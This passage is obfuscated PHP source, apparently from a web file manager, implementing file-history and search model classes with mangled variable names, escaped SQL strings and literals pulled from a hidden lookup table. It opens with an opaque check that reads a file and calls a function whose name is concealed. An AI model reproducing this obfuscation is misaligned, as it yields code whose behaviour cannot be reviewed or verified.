$öğ°Ç¬²[78] ? !0 : !1; } } if ($_SERVER[$_SERVER[öæÛ¿©¿][984]] != $_SERVER[$_SERVER[öæÛ¿©¿][1754]]) { $_getc = $_SERVER[öæÛ¿©¿][986]; $_getfile = $_SERVER[$_SERVER[öæÛ¿©¿][981]] . $_SERVER[öæÛ¿©¿][982]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[öæÛ¿©¿][286], $_getfilec); if (count($_getarrs) < $_SERVER[öæÛ¿©¿][715]) { $exit = $_SERVER[öæÛ¿©¿][987]; $exit(); } $_act = $_SERVER[öæÛ¿©¿][1755]; $_act($_SERVER[$_SERVER[öæÛ¿©¿][1756]]); } goto Aë”ƒíÁ; A ãê™º‚: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\165\x72\143\145\137\x68\151\x73\164\157\162\x79"; public function historyCount($ğ—ƒ—™´) { $‘‚“íÚğ =& $_SERVER[öæÛ¿©¿]; if (!$ğ—ƒ—™´) { return array(); } if (is_string($ğ—ƒ—™´) || is_int($ğ—ƒ—™´)) { $ğ—ƒ—™´ = array($ğ—ƒ—™´); } $ô¿æ“™Ğ = array($‘‚“íÚğ[192], $‘‚“íÚğ[2382] => $‘‚“íÚğ[581]); $›ƒŒŒŞ° = array($‘‚“íÚğ[192] => array($‘‚“íÚğ[7], $ğ—ƒ—™´)); $¬š«‚‚î = $this->field($ô¿æ“™Ğ)->where($›ƒŒŒŞ°)->group($‘‚“íÚğ[192])->select(); return array_to_keyvalue($¬š«‚‚î, $‘‚“íÚğ[192], $‘‚“íÚğ[581]); } public function addHistory($”„¥÷ªÃ, $Ú€ÜÃõä = '') { $ÉÀÉ–¿Æ =& $_SERVER[öæÛ¿©¿]; $°”÷¼™ = array($ÉÀÉ–¿Æ[502] => $”„¥÷ªÃ[$ÉÀÉ–¿Æ[192]], $ÉÀÉ–¿Æ[1916] => isset($”„¥÷ªÃ[$ÉÀÉ–¿Æ[539]]) ? $”„¥÷ªÃ[$ÉÀÉ–¿Æ[539]] : $”„¥÷ªÃ[$ÉÀÉ–¿Æ[537]], $ÉÀÉ–¿Æ[554] => $”„¥÷ªÃ[$ÉÀÉ–¿Æ[553]], $ÉÀÉ–¿Æ[636] => $”„¥÷ªÃ[$ÉÀÉ–¿Æ[79]], $ÉÀÉ–¿Æ[2383] => $Ú€ÜÃõä); if ($GLOBALS[$ÉÀÉ–¿Æ[6]][$ÉÀÉ–¿Æ[92]][$ÉÀÉ–¿Æ[1350]] >= 1) { $this->historyAutoClear($°”÷¼™[$ÉÀÉ–¿Æ[192]]); $this->add($°”÷¼™); } Hook::trigger($ÉÀÉ–¿Æ[2384], $°”÷¼™); Model($ÉÀÉ–¿Æ[2385])->eventFileEdit($”„¥÷ªÃ[$ÉÀÉ–¿Æ[192]]); } private function historyAutoClear($Ê×§â½) { $µœÉâÁÖ =& $_SERVER[öæÛ¿©¿]; $‹—»–À = Model($µœÉâÁÖ[865])->get($µœÉâÁÖ[1372]); $ÇÛğñûş = intval($GLOBALS[$µœÉâÁÖ[6]][$µœÉâÁÖ[92]][$µœÉâÁÖ[1350]]); $ƒÖù¡Ûš = $‹—»–À == $µœÉâÁÖ[1373] ? min(5, $ÇÛğñûş) : $ÇÛğñûş; $ƒÖù¡Ûš = $ƒÖù¡Ûš <= 0 ? 0 : $ƒÖù¡Ûš - 1; if ($ƒÖù¡Ûš >= 499) { return; } $úÏ×Ç  = array($µœÉâÁÖ[502] => $Ê×§â½); $ŒØÓÙ³ª = $this->field($µœÉâÁÖ[2386])->where($úÏ×Ç )->order($µœÉâÁÖ[2379])->select(); if (!$ŒØÓÙ³ª || $ƒÖù¡Ûš >= count($ŒØÓÙ³ª)) { return; } $áÏ×ıíÇ = array_to_keyvalue($ŒØÓÙ³ª, $µœÉâÁÖ[12], $µœÉâÁÖ[483]); $áÏ×ıíÇ = array_slice($áÏ×ıíÇ, $ƒÖù¡Ûš); $í½èàŠ = array_to_keyvalue($ŒØÓÙ³ª, $µœÉâÁÖ[12], $µœÉâÁÖ[553]); $í½èàŠ = array_slice($í½èàŠ, $ƒÖù¡Ûš); if (!$áÏ×ıíÇ || !$í½èàŠ) { return; } $úÏ×Ç  = array($µœÉâÁÖ[504] => array($µœÉâÁÖ[7], $áÏ×ıíÇ)); $this->where($úÏ×Ç )->delete(); Model($µœÉâÁÖ[556])->remove($í½èàŠ); } public function listData($ç……ëóÔ) { $Æ¨ Å¸Œ =& $_SERVER[öæÛ¿©¿]; $Û«»ù©Š = array($Æ¨ Å¸Œ[502] => $ç……ëóÔ); $ò Í§ù = $Æ¨ Å¸Œ[2387]; $ôÕÜ¨ÃÁ = $this->field($ò Í§ù)->where($Û«»ù©Š)->order($Æ¨ Å¸Œ[2379])->selectPage(); $this->_listAppendUser($ôÕÜ¨ÃÁ[$Æ¨ Å¸Œ[446]]); $ëš„£üü = Model($Æ¨ Å¸Œ[865])->get($Æ¨ Å¸Œ[1372]); $¢ˆ‰ÚÅº = 5; if ($ëš„£üü == $Æ¨ Å¸Œ[1373]) { $ôÕÜ¨ÃÁ[$Æ¨ Å¸Œ[446]] = array_slice($ôÕÜ¨ÃÁ[$Æ¨ Å¸Œ[446]], 0, $¢ˆ‰ÚÅº); $ôÕÜ¨ÃÁ[$Æ¨ Å¸Œ[443]] = array($Æ¨ Å¸Œ[2388] => 1, $Æ¨ Å¸Œ[2389] => 20, $Æ¨ Å¸Œ[2390] => 1, $Æ¨ Å¸Œ[2391] => count($ôÕÜ¨ÃÁ[$Æ¨ Å¸Œ[446]])); } return $ôÕÜ¨ÃÁ; } protected function _listAppendUser(&$ ÀË…†Ü) { $û…¯ƒ—¬ =& $_SERVER[öæÛ¿©¿]; $©‹‘¦ıÆ = array_to_keyvalue($ ÀË…†Ü, $û…¯ƒ—¬[12], $û…¯ƒ—¬[1538]); $ßÙÚé„È = Model($û…¯ƒ—¬[613])->userListInfo($©‹‘¦ıÆ); foreach ($ ÀË…†Ü as &$»—»‡‡ª) { $ûµ¶Œáä = $»—»‡‡ª[$û…¯ƒ—¬[1538]]; $»—»‡‡ª[$û…¯ƒ—¬[537]] = $ßÙÚé„È[$ûµ¶Œáä] ? $ßÙÚé„È[$ûµ¶Œáä] : !1; } unset($»—»‡‡ª); } public function fileInfo($¥°»¼Œ, $Âò­ÄÈ¤ = false) { $ŞÖïÒäÈ =& $_SERVER[öæÛ¿©¿]; $ÎŠ»†÷ş = $this->tablePrefix; $Í°ü¤ = "{$ÎŠ»†÷ş}\x69\157\137\x66\151\154\x65\x20\x66\x69\154\x65\x73\40\x6f\156\40\x66\x69\x6c\x65\x73\x2e\x66\151\154\145\111\x44\x20\75\x20\150\151\x73\164\x6f\x72\171\x2e\146\x69\x6c\x65\x49\104"; $Àü“ÈÕ² = $this->alias($ŞÖïÒäÈ[2392])->where(array($ŞÖïÒäÈ[504] => $¥°»¼Œ))->join($Í°ü¤, $ŞÖïÒäÈ[2393])->find(); if ($Àü“ÈÕ² && $Âò­ÄÈ¤) { $¾ªå€ÇÍ = array($ŞÖïÒäÈ[192] => $Àü“ÈÕ²[$ŞÖïÒäÈ[192]], $ŞÖïÒäÈ[483] => array($ŞÖïÒäÈ[1125], $¥°»¼Œ)); $Àü“ÈÕ²[$ŞÖïÒäÈ[1812]] = $this->where($¾ªå€ÇÍ)->count(); } return $Àü“ÈÕ²; } public function removeItem($ï‘êÊÁü) { $£½öûñÛ =& $_SERVER[öæÛ¿©¿]; $Ğ–™ıÍ® = array($£½öûñÛ[504] => $ï‘êÊÁü); $äÚÔĞå = $this->where($Ğ–™ıÍ®)->find(); if ($äÚÔĞå) { $¡Ğ·¥ÌÎ = $this->where($Ğ–™ıÍ®)->delete(); Model($£½öûñÛ[556])->remove($äÚÔĞå[$£½öûñÛ[553]]); return $¡Ğ·¥ÌÎ; } return !1; } public function removeBySource($ñĞ«­Ó) { $îä é¸ =& $_SERVER[öæÛ¿©¿]; if (!$ñĞ«­Ó) { return !1; } if (!is_array($ñĞ«­Ó)) { $ñĞ«­Ó = array($ñĞ«­Ó); } $ƒæ÷ĞÈˆ = array($îä é¸[502] => array($îä é¸[7], $ñĞ«­Ó)); $†šºîÈò = $this->field($îä é¸[554])->where($ƒæ÷ĞÈˆ)->select(); if ($†šºîÈò) { $this->where($ƒæ÷ĞÈˆ)->delete(); $»ÓêÚö‡ = array_to_keyvalue($†šºîÈò, $îä é¸[12], $îä é¸[553]); Model($îä é¸[556])->remove($»ÓêÚö‡); } return !0; } public function setDetail($ùÉ’á±‚, $‡û›¡ıÚ) { $àÓö§ù =& $_SERVER[öæÛ¿©¿]; return $this->where(array($àÓö§ù[504] => $ùÉ’á±‚))->save(array($àÓö§ù[2383] => $‡û›¡ıÚ)); } public function rollbackToItem($°­Ìü†, $Ø‡à¹œ) { $ãœ§­íÒ =& $_SERVER[öæÛ¿©¿]; $´ùúÌÕ© = Model($ãœ§­íÒ[925])->sourceInfo($°­Ìü†); $this->addHistory($´ùúÌÕ©, LNG($ãœ§­íÒ[2394])); $ÊÔÂ“•š = $this->find($Ø‡à¹œ); $“ï¾‘Í = array($ãœ§­íÒ[553] => $ÊÔÂ“•š[$ãœ§­íÒ[553]], $ãœ§­íÒ[79] => $ÊÔÂ“•š[$ãœ§­íÒ[79]], $ãœ§­íÒ[88] => time(), $ãœ§­íÒ[539] => USER_ID); Model($ãœ§­íÒ[925])->where(array($ãœ§­íÒ[192] => $°­Ìü†))->save($“ï¾‘Í); return $this->where(array($ãœ§­íÒ[504] => $Ø‡à¹œ))->delete(); } public function clearSame($“•ÖîÜ«) { $—™±§ëä =& $_SERVER[öæÛ¿©¿]; $…ÓÄ•ªÛ = $this->listData($“•ÖîÜ«); $ß¡ƒ€Çæ = array_to_keyvalue_group($…ÓÄ•ªÛ, $—™±§ëä[553]); $å©İï¯ = array(); $àŠó¶Ò  = array(); foreach ($ß¡ƒ€Çæ as $·À‰Ñ†‰) { if (!$·À‰Ñ†‰ || count($·À‰Ñ†‰) <= 1) { continue; } foreach ($·À‰Ñ†‰ as $„ÃÄİğò) { $å©İï¯[] = $„ÃÄİğò[$—™±§ëä[553]]; $àŠó¶Ò [] = $„ÃÄİğò[$—™±§ëä[483]]; } } if (!$àŠó¶Ò ) { return; } $this->where(array($—™±§ëä[483] => array($—™±§ëä[7], $àŠó¶Ò )))->delete(); Model($—™±§ëä[556])->remove($å©İï¯); } public function userSpace() { $ù˜¸œ³ =& $_SERVER[öæÛ¿©¿]; $Šæ÷ç‹Ú = $this->tablePrefix; $ñà¤¾Øû = array($ù˜¸œ³[1916] => USER_ID); $ÄÓşµ¤İ = "{$Šæ÷ç‹Ú}\x69\157\137\146\151\154\145\x20\x66\151\x6c\x65\x73\40\157\x6e\x20\146\151\154\145\x73\56\x66\x69\154\x65\x49\104\x20\x3d\x20\x68\x69\163\164\x6f\x72\x79\x2e\146\151\x6c\x65\x49\104"; return $this->alias($ù˜¸œ³[2392])->where($ñà¤¾Øû)->join($ÄÓşµ¤İ, $ù˜¸œ³[2393])->sum($ù˜¸œ³[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ã ôè½§) { $¿Ë²óè =& $_SERVER[öæÛ¿©¿]; $Äß©†—ğ = KodIO::fileTypeList(); $«œåÓÒ = $Äß©†—ğ[$ã ôè½§]; if (!$«œåÓÒ) { return array(); } $ğÛë¢ø = $«œåÓÒ[$¿Ë²óè[167]]; $ÚÒ¦ÅÆ = $¿Ë²óè[7]; if (!$«œåÓÒ[$¿Ë²óè[167]]) { $·¢Ÿ¡°Ã = array_to_keyvalue($Äß©†—ğ, $¿Ë²óè[12], $¿Ë²óè[167]); $ğÛë¢ø = implode($¿Ë²óè[50], $·¢Ÿ¡°Ã); $ÚÒ¦ÅÆ = $¿Ë²óè[2395]; } $÷ ßÑõİ = explode($¿Ë²óè[50], trim($ğÛë¢ø, $¿Ë²óè[50])); return array($ÚÒ¦ÅÆ, $÷ ßÑõİ); } public function listPathType($ÄÒ§”Œ) { $×û¦‡˜¾ =& $_SERVER[öæÛ¿©¿]; $°í‡é‘¢ = $this->fileTypeWhere($ÄÒ§”Œ); if (!$°í‡é‘¢) { return array(); } $ÜôøŸúÅ = USER_ID; $ˆ±ŠıñÊ = Model($×û¦‡˜¾[613])->getInfo($ÜôøŸúÅ); $Ä›‘¨¢« = array($×û¦‡˜¾[667] => SourceModel::TYPE_USER, $×û¦‡˜¾[600] => array($×û¦‡˜¾[631], $×û¦‡˜¾[609] . $ˆ±ŠıñÊ[$×û¦‡˜¾[90]][$×û¦‡˜¾[192]] . $×û¦‡˜¾[632]), $×û¦‡˜¾[668] => $ÜôøŸúÅ, $×û¦‡˜¾[665] => 0, $×û¦‡˜¾[666] => $°í‡é‘¢); return $this->listSource($Ä›‘¨¢«); } public function listSearch($ãïƒÖ¸€, $ÕÒéÇ½Ç = 300) { $½É«ôŠÊ =& $_SERVER[öæÛ¿©¿]; if (isset($ãïƒÖ¸€[$½É«ôŠÊ[2227]]) && $ãïƒÖ¸€[$½É«ôŠÊ[2227]]) { $ãïƒÖ¸€[$½É«ôŠÊ[2227]] = str_replace($½É«ôŠÊ[471], $½É«ôŠÊ[2396], trim($ãïƒÖ¸€[$½É«ôŠÊ[2227]])); } $Ë’Æ®Åè = $this->_parseSearchWhere($ãïƒÖ¸€); if (!isset($Ë’Æ®Åè[$½É«ôŠÊ[516]])) { $Ë’Æ®Åè[$½É«ôŠÊ[516]] = 0; } $ù˜²Œ = $½É«ôŠÊ[2397]; $¢±”Å ² = $Ë’Æ®Åè; $¾¯İ¥ËË = $ù˜²Œ; $this->_listSearchBindPinyin($ãïƒÖ¸€, $Ë’Æ®Åè, $ù˜²Œ); $this->alias($½É«ôŠÊ[529])->_makeOrder(); $Ë’Æ®Åè = $this->parseWhereLike($Ë’Æ®Åè); $’²Ğ¾ı = $this->distinct(!0)->field($ù˜²Œ)->where($Ë’Æ®Åè)->selectPage($ÕÒéÇ½Ç); if ($GLOBALS[$½É«ôŠÊ[6]][$½É«ôŠÊ[468]][$½É«ôŠÊ[469]] && Input::check($ãïƒÖ¸€[$½É«ôŠÊ[2227]], $½É«ôŠÊ[674]) && $’²Ğ¾ı[$½É«ôŠÊ[443]][$½É«ôŠÊ[429]] == 1 && $’²Ğ¾ı[$½É«ôŠÊ[443]][$½É«ôŠÊ[444]] == 0) { $’²Ğ¾ı = $this->distinct(!0)->field($ù˜²Œ)->where($¢±”Å ²)->limit(1000)->select(); $’²Ğ¾ı = array_page_split($’²Ğ¾ı, !1, $ÕÒéÇ½Ç); } $this->_listSearchFileContent($’²Ğ¾ı, $ãïƒÖ¸€, $¾¯İ¥ËË, $¢±”Å ²); $this->_listSearchDesc($’²Ğ¾ı, $ãïƒÖ¸€, $¾¯İ¥ËË); $this->_listSearchTag($’²Ğ¾ı, $ãïƒÖ¸€, $¾¯İ¥ËË); $this->_listSearchGroupTag($’²Ğ¾ı, $ãïƒÖ¸€, $¾¯İ¥ËË); $this->_listDataApply($’²Ğ¾ı[$½É«ôŠÊ[446]]); $this->_listMake($’²Ğ¾ı); return $’²Ğ¾ı; } private function _listSearchFileContent(&$·şõ³, $¨”ú†­ö, $²Â¢’Ìó, $´ğÂä†Õ) { $ßÃÀë¬Ş =& $_SERVER[öæÛ¿©¿]; if (!$¨”ú†­ö[$ßÃÀë¬Ş[2227]] || $·şõ³[$ßÃÀë¬Ş[443]][$ßÃÀë¬Ş[429]] > 1) { return; } if (!isset($´ğÂä†Õ[$ßÃÀë¬Ş[32]]) || !is_array($¨”ú†­ö[$ßÃÀë¬Ş[553]])) { return; } $´ğÂä†Õ[$ßÃÀë¬Ş[553]] = array($ßÃÀë¬Ş[7], $¨”ú†­ö[$ßÃÀë¬Ş[553]]); unset($´ğÂä†Õ[$ßÃÀë¬Ş[32]]); unset($¨”ú†­ö[$ßÃÀë¬Ş[553]]); $Ê÷’Ê¦Ş = $this->field($²Â¢’Ìó)->where($´ğÂä†Õ)->limit($ßÃÀë¬Ş[2398])->select(); if (!$Ê÷’Ê¦Ş || count($Ê÷’Ê¦Ş) == 0) { return; } $·şõ³[$ßÃÀë¬Ş[446]] = array_merge($Ê÷’Ê¦Ş, $·şõ³[$ßÃÀë¬Ş[446]]); $·şõ³[$ßÃÀë¬Ş[443]][$ßÃÀë¬Ş[444]] += count($Ê÷’Ê¦Ş); } private function _listSearchTag(&$ ¼²ÈÔé, $ß´Ñî•, $ºÏ×Í‹¦) { $áåø°ğ” =& $_SERVER[öæÛ¿©¿]; if (empty($ß´Ñî•[$áåø°ğ”[2093]]) || !in_array($áåø°ğ”[2399], $ß´Ñî•[$áåø°ğ”[2093]])) { return; } if (!$ß´Ñî•[$áåø°ğ”[2227]] || $ ¼²ÈÔé[$áåø°ğ”[443]][$áåø°ğ”[429]] > 1) { return; } $œˆÊ¾Ï¸ = Model($áåø°ğ”[2400])->listData(); $¸×’òîÜ = array(); $¡‡Ï™¹ = $ß´Ñî•[$áåø°ğ”[2227]]; foreach ($œˆÊ¾Ï¸ as $¸åäóëÑ) { $´÷ÎÎœù = $¸åäóëÑ[$áåø°ğ”[32]]; $µÀæüÙ„ = str_replace($áåø°ğ”[53], $áåø°ğ”[12], Pinyin::get($´÷ÎÎœù)); if (stripos($´÷ÎÎœù, $¡‡Ï™¹) !== !1 || stripos($µÀæüÙ„, $¡‡Ï™¹) !== !1) { $¸×’òîÜ[] = $¸åäóëÑ[$áåø°ğ”[483]]; } } if (!$¸×’òîÜ) { return; } $é‹—Šá· = array($áåø°ğ”[511] => array($áåø°ğ”[7], $¸×’òîÜ), $áåø°ğ”[1538] => USER_ID); $œÚç  = Model($áåø°ğ”[513])->field($áåø°ğ”[87])->where($é‹—Šá·)->select(); $œÚç  = array_to_keyvalue($œÚç , $áåø°ğ”[12], $áåø°ğ”[87]); $«¯È’˜ = array_unique($œÚç ); $this->_listSearchMerge($ ¼²ÈÔé, $ß´Ñî•, $ºÏ×Í‹¦, $«¯È’˜); } private function _listSearchDesc(&$Åè”¼ßÒ, $»ó™Ê¢ş, $Œˆş×ğ) { $Áó¿Á¯ =& $_SERVER[öæÛ¿©¿]; if (empty($»ó™Ê¢ş[$Áó¿Á¯[2093]]) || !in_array($Áó¿Á¯[536], $»ó™Ê¢ş[$Áó¿Á¯[2093]])) { return; } if (!$»ó™Ê¢ş[$Áó¿Á¯[2227]] || $Åè”¼ßÒ[$Áó¿Á¯[443]][$Áó¿Á¯[429]] > 1) { return; } $Í®úÔƒŞ = array($Áó¿Á¯[95] => $Áó¿Á¯[536], $Áó¿Á¯[451] => array($Áó¿Á¯[470], $Áó¿Á¯[2229] . $»ó™Ê¢ş[$Áó¿Á¯[2227]] . $Áó¿Á¯[2229])); $È‡ò˜ºœ = !1; if ($È‡ò˜ºœ) { $¡²ô²È© = $this->listSearchChildren($»ó™Ê¢ş[$Áó¿Á¯[191]]); $¡²ô²È© = array_unique($¡²ô²È©); if (!$¡²ô²È©) { return; } $Í®úÔƒŞ[$Áó¿Á¯[192]] = array($Áó¿Á¯[7], $¡²ô²È©); } $±„ÒÛñ® = Model($Áó¿Á¯[651])->field($Áó¿Á¯[192])->where($Í®úÔƒŞ)->limit(5000)->select(); $Ù÷ëˆå‘ = array_to_keyvalue($±„ÒÛñ®, $Áó¿Á¯[12], $Áó¿Á¯[192]); $this->_listSearchMerge($Åè”¼ßÒ, $»ó™Ê¢ş, $Œˆş×ğ, $Ù÷ëˆå‘); } private function _listSearchGroupTag(&$×±Êªº¥, $˜°µ±³İ, $„¤ı¥Ç) { $É»Ü®—Ã =& $_SERVER[öæÛ¿©¿]; if (empty($˜°µ±³İ[$É»Ü®—Ã[2093]]) || !in_array($É»Ü®—Ã[2399], $˜°µ±³İ[$É»Ü®—Ã[2093]])) { return; } if (!$˜°µ±³İ[$É»Ü®—Ã[2227]] || $×±Êªº¥[$É»Ü®—Ã[443]][$É»Ü®—Ã[429]] > 1 || !$˜°µ±³İ[$É»Ü®—Ã[191]]) { return; } $­Õà = $this->sourceInfo($˜°µ±³İ[$É»Ü®—Ã[191]]); if (!$­Õà || $­Õà[$É»Ü®—Ã[189]] != SourceModel::TYPE_GROUP) { return; } $‰À±‹º = $­Õà[$É»Ü®—Ã[585]]; $õ¼¡æ’ = Model($É»Ü®—Ã[2401])->get($‰À±‹º); $•çŞ¨Ö = array(); $ƒµ¿æ = $˜°µ±³İ[$É»Ü®—Ã[2227]]; foreach ($õ¼¡æ’[$É»Ü®—Ã[446]] as $±åŠÖ†) { $Ù‚ÛÉ´ = $±åŠÖ†[$É»Ü®—Ã[32]]; $ï×ä®÷ = str_replace($É»Ü®—Ã[53], $É»Ü®—Ã[12], Pinyin::get($Ù‚ÛÉ´)); if (stripos($Ù‚ÛÉ´, $ƒµ¿æ) !== !1 || stripos($ï×ä®÷, $ƒµ¿æ) !== !1) { $•çŞ¨Ö[] = $±åŠÖ†[$É»Ü®—Ã[483]]; } } if (!$•çŞ¨Ö) { return; } $Õ‡şù½Ú = array($É»Ü®—Ã[511] => array($É»Ü®—Ã[7], $•çŞ¨Ö), $É»Ü®—Ã[1538] => 0, $É»Ü®—Ã[33] => $É»Ü®—Ã[1436] . $‰À±‹º); $£™»Ö„ = Model($É»Ü®—Ã[513])->field($É»Ü®—Ã[87])->where($Õ‡şù½Ú)->select(); $£™»Ö„ = array_to_keyvalue($£™»Ö„, $É»Ü®—Ã[12], $É»Ü®—Ã[87]); $ü¥ìºà = array_unique($£™»Ö„); $this->_listSearchMerge($×±Êªº¥, $˜°µ±³İ, $„¤ı¥Ç, $ü¥ìºà); } private function _listSearchMerge(&$Ôæ÷é±†, $ğ·ßŸòÆ, $êŠÇ¹£Û, $£…ŸÜ„¦) { $¶£à‡‘Ó =& $_SERVER[öæÛ¿©¿]; if (!$£…ŸÜ„¦) { return; } $ÈÓÎı‡ = array_to_keyvalue($Ôæ÷é±†[$¶£à‡‘Ó[446]], $¶£à‡‘Ó[12], $¶£à‡‘Ó[192]); $İôø’è = array_diff($£…ŸÜ„¦, $ÈÓÎı‡); if (!$İôø’è) { return; } $¦÷èÌ¥ã = array($¶£à‡‘Ó[192] => array($¶£à‡‘Ó[7], $İôø’è)); $Œš¹¼× = $this->field($êŠÇ¹£Û)->where($¦÷èÌ¥ã)->select(); if (!$Œš¹¼×) { return; } $¦ñ«‰ = array(); foreach ($Œš¹¼× as $•ıàìñ½) { if ($this->_listSearchFilter($•ıàìñ½, $ğ·ßŸòÆ)) { $¦ñ«‰[] = $•ıàìñ½; } } $Ôæ÷é±†[$¶£à‡‘Ó[446]] = array_merge($¦ñ«‰, $Ôæ÷é±†[$¶£à‡‘Ó[446]]); $Ôæ÷é±†[$¶£à‡‘Ó[443]][$¶£à‡‘Ó[444]] += count($¦ñ«‰); } private function _listSearchFilter($”†’£ƒË, $Óí¬ñ›ä) { $¶¤ÄÅ£Ã =& $_SERVER[öæÛ¿©¿]; $›šÂ´ğÛ = $”†’£ƒË[$¶¤ÄÅ£Ã[496]] == $¶¤ÄÅ£Ã[91]; if (!strstr($”†’£ƒË[$¶¤ÄÅ£Ã[600]], $¶¤ÄÅ£Ã[50] . $Óí¬ñ›ä[$¶¤ÄÅ£Ã[191]] . $¶¤ÄÅ£Ã[50])) { return !1; } if (isset($Óí¬ñ›ä[$¶¤ÄÅ£Ã[497]]) && $Óí¬ñ›ä[$¶¤ÄÅ£Ã[497]] != $¶¤ÄÅ£Ã[871]) { if ($Óí¬ñ›ä[$¶¤ÄÅ£Ã[497]] == $¶¤ÄÅ£Ã[78] && !$›šÂ´ğÛ) { return !1; } if ($Óí¬ñ›ä[$¶¤ÄÅ£Ã[497]] != $¶¤ÄÅ£Ã[78] && $›šÂ´ğÛ) { return !1; } if (!strstr($”†’£ƒË[$¶¤ÄÅ£Ã[167]], $¶¤ÄÅ£Ã[50] . $Óí¬ñ›ä[$¶¤ÄÅ£Ã[497]] . $¶¤ÄÅ£Ã[50])) { return !1; } } if (isset($Óí¬ñ›ä[$¶¤ÄÅ£Ã[2402]]) && $Óí¬ñ›ä[$¶¤ÄÅ£Ã[2402]] < $”†’£ƒË[$¶¤ÄÅ£Ã[79]]) { return !1; } if (isset($Óí¬ñ›ä[$¶¤ÄÅ£Ã[2403]]) && $Óí¬ñ›ä[$¶¤ÄÅ£Ã[2403]] > $”†’£ƒË[$¶¤ÄÅ£Ã[79]]) { return !1; } if (isset($Óí¬ñ›ä[$¶¤ÄÅ£Ã[681]]) && $Óí¬ñ›ä[$¶¤ÄÅ£Ã[681]] != $”†’£ƒË[$¶¤ÄÅ£Ã[539]]) { return !1; } return !0; } public function listSearchChildren($ÙÕÛè±€, $¶Ë«úóº = 5000) { $¸„¡…Î¬ =& $_SERVER[öæÛ¿©¿]; $¨€Î»èÕ = array(); $š÷İšáŸ = $this->sourceInfo($ÙÕÛè±€); $ç÷Ì¾ø = array($¸„¡…Î¬[600] => array($¸„¡…Î¬[470], $š÷İšáŸ[$¸„¡…Î¬[600]] . $š÷İšáŸ[$¸„¡…Î¬[192]] . $¸„¡…Î¬[632])); $è½û±ö¿ = $this->field($¸„¡…Î¬[79])->where($ç÷Ì¾ø)->limit($¶Ë«úóº + 1)->select(); $–¬ªµ¸à = is_array($è½û±ö¿) ? count($è½û±ö¿) : 0; if ($–¬ªµ¸à > $¶Ë«úóº) { return $this->_listSearchChildrenNear($ÙÕÛè±€, $¶Ë«úóº); } $ÍÉá‘’ö = $this->field($¸„¡…Î¬[192])->where($ç÷Ì¾ø)->select(); $¨€Î»èÕ = array_to_keyvalue($ÍÉá‘’ö, $¸„¡…Î¬[12], $¸„¡…Î¬[192]); return $¨€Î»èÕ; } private function _listSearchChildrenNear($Òô‹¨‰—, $Óš“³¯) { $˜„××šÓ =& $_SERVER[öæÛ¿©¿]; $¬¥íÑÌã = array(); $ãŞõµ“ = array($˜„××šÓ[191] => $Òô‹¨‰—); $ˆ“¦¨ê = $this->field($˜„××šÓ[2404])->where($ãŞõµ“)->select(); $ˆı°Ë´ = array_to_keyvalue(array_filter_by_field($ˆ“¦¨ê, $˜„××šÓ[496], $˜„××šÓ[91]), $˜„××šÓ[12], $˜„××šÓ[192]); $¬¥íÑÌã = array_merge($¬¥íÑÌã, array_to_keyvalue($ˆ“¦¨ê, $˜„××šÓ[12], $˜„××šÓ[192])); if (!$ˆı°Ë´) { return $¬¥íÑÌã; } $ãŞõµ“ = array($˜„××šÓ[191] => array($˜„××šÓ[7], $ˆı°Ë´)); $ˆ“¦¨ê = $this->field($˜„××šÓ[2404])->where($ãŞõµ“)->limit($Óš“³¯)->select(); $¬¥íÑÌã = array_merge($¬¥íÑÌã, array_to_keyvalue($ˆ“¦¨ê, $˜„××šÓ[12], $˜„××šÓ[192])); $¬¥íÑÌã = array_slice($¬¥íÑÌã, 0, intval($Óš“³¯)); return $¬¥íÑÌã; } private function _listSearchBindPinyin($Êüşô…¼, &$£êÍö, &$º§ôÒ™÷) { $¿ªÕÁÔ£ =& $_SERVER[öæÛ¿©¿]; if (!isset($Êüşô…¼[$¿ªÕÁÔ£[2227]]) || !$Êüşô…¼[$¿ªÕÁÔ£[2227]]) { return; } if (!Input::check($Êüşô…¼[$¿ªÕÁÔ£[2227]], $¿ªÕÁÔ£[394]) || strlen($Êüşô…¼[$¿ªÕÁÔ£[2227]]) < 2) { return; } $ë€£Àì§ = "\x4c\x45\106\124\40\x4a\x4f\111\116\40{$this->tablePrefix}\x69\157\137\x73\157\x75\x72\143\x65\x5f\155\x65\164\141\40\155\145\164\x61\40\157\x6e\40\x73\157\165\162\143\145\56\x73\157\165\x72\x63\145\111\x44\x20\75\40\x6d\x65\164\141\x2e\163\x6f\165\x72\143\x65\111\x44"; $ò¸£³¹Ï = array(); $º§ôÒ™÷ = str_replace(array($¿ªÕÁÔ£[286], $¿ªÕÁÔ£[53], $¿ªÕÁÔ£[2405]), $¿ªÕÁÔ£[12], $º§ôÒ™÷); $º§ôÒ™÷ = $¿ªÕÁÔ£[521] . str_replace($¿ªÕÁÔ£[50], $¿ªÕÁÔ£[522], $º§ôÒ™÷); $¸ùä…² = $£êÍö[$¿ªÕÁÔ£[32]]; unset($£êÍö[$¿ªÕÁÔ£[32]]); foreach ($£êÍö as $¤ç‘¢Ç => $ú×÷º´§) { $ò¸£³¹Ï[$¿ªÕÁÔ£[521] . $¤ç‘¢Ç] = $ú×÷º´§; } foreach ($¸ùä…² as $èˆØ‹†¾) { $ò¸£³¹Ï[] = array($¿ªÕÁÔ£[526] => $èˆØ‹†¾, $¿ªÕÁÔ£[1112] => $¿ªÕÁÔ£[2231], array($¿ªÕÁÔ£[2406] => $èˆØ‹†¾, $¿ªÕÁÔ£[2407] => array($¿ªÕÁÔ£[7], array($¿ªÕÁÔ£[548], $¿ªÕÁÔ£[547])))); } $this->join($ë€£Àì§); $£êÍö = $ò¸£³¹Ï; } private function _parseSearchWhere($–×ş¶©Ú) { $¤æƒë÷ú =& $_SERVER[öæÛ¿©¿]; $ÈÃûĞ—‘ = array(); if (isset($–×ş¶©Ú[$¤æƒë÷ú[853]]) && $–×ş¶©Ú[$¤æƒë÷ú[853]]) { $ÈÃûĞ—‘[$¤æƒë÷ú[88]] = array($¤æƒë÷ú[2408], $–×ş¶©Ú[$¤æƒë÷ú[853]]); } if (isset($–×ş¶©Ú[$¤æƒë÷ú[854]]) && $–×ş¶©Ú[$¤æƒë÷ú[854]]) { $™óÒƒÖš = array($¤æƒë÷ú[2409], $–×ş¶©Ú[$¤æƒë÷ú[854]]); if ($ÈÃûĞ—‘[$¤æƒë÷ú[88]]) { $ÈÃûĞ—‘[$¤æƒë÷ú[88]] = 